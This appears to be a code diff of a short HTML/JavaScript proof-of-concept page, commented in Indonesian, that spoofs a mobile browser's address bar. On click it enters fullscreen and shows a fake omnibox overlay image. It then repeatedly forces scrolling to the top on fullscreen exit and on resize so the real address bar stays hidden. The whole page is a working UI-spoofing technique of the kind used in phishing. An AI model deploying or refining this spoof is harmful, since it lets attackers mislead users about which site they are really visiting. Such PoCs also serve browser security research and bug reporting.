@@ -1,14 +1,14 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <title>Security UI Spoof</title>
     <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
+    <title>Security UI Spoof</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
     <style>
         body {
             margin: 0;
             padding: 0;
-            height: 200vh; /* supaya page bisa scroll */
+            height: 200vh; /* bikin page bisa scroll */
             font-family: sans-serif;
         }
         #spoof {
@@ -30,7 +30,7 @@
 </head>
 <body>
 
-<img id="spoof" src="spoof.png" alt="overlay">
+<img id="spoof" src="spoof2.png" alt="overlay">
 <div id="content">
     <h1>Click anywhere on the page to spoof the omnibox!</h1>
 </div>
@@ -39,15 +39,15 @@
 const spoof = document.getElementById("spoof");
 const content = document.getElementById("content");
 
-// Fungsi paksa scroll ke atas
-function scrollToTop() {
-    window.scrollTo({ top: 0, left: 0, behavior: 'instant' });
+// Fungsi scroll ke atas (lebih “paksa”)
+function scrollTopForce() {
+    window.scrollTo(0, 0);
     document.body.scrollTop = 0;
     document.documentElement.scrollTop = 0;
 }
 
 // Tap anywhere → fullscreen + overlay
-onclick = async () => {
+document.addEventListener('click', async () => {
     spoof.style.display = "block";
     content.style.display = "none";
 
@@ -57,22 +57,25 @@ onclick = async () => {
         } catch(e) {}
     }
 
-    // Scroll ke atas langsung (untuk safety)
-    scrollToTop();
-}
+    // Scroll langsung ke atas
+    scrollTopForce();
+}, { once: true });
 
-// Ketika keluar fullscreen → scroll ke atas supaya omnibar tertutup
+// Listener fullscreen change → scroll ke atas ketika keluar fullscreen
 document.addEventListener('fullscreenchange', () => {
     if (!document.fullscreenElement) {
-        scrollToTop();
+        // Paksa scroll beberapa kali supaya omnibar nutup
+        let attempts = 0;
+        const interval = setInterval(() => {
+            scrollTopForce();
+            attempts++;
+            if (attempts > 10) clearInterval(interval);
+        }, 50);
     }
 });
 
-// Interval ekstra untuk Android back / omnibar muncul
-setInterval(scrollToTop, 50);
-
-// Resize listener juga untuk Android omnibar
-window.addEventListener('resize', scrollToTop);
+// Resize listener → kadang toolbar Android muncul
+window.addEventListener('resize', scrollTopForce);
 </script>
 
 </body>
